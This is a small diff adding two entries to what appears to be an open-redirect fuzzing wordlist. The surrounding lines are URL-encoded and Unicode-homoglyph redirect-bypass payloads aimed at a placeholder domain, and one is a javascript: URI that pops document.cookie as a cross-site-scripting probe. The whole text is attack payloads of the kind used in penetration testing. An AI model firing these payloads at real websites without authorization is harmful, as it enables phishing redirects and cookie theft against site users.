@@ -267,6 +267,7 @@ https:/%5clocaldomain.pw/
 javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
 /http://localdomain.pw
 /%2f%2flocaldomain.pw
+//%2f%2flocaldomain.pw
 /localdomain.pw/%2f%2e%2e
 /http:/localdomain.pw
 http:/localdomain.pw
@@ -439,6 +440,7 @@ http://www.whitelisteddomain.tld%2eⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐ�
 https:/%5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 /http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /%2f%2fⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//%2f%2fⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
 /http:/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 http:/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
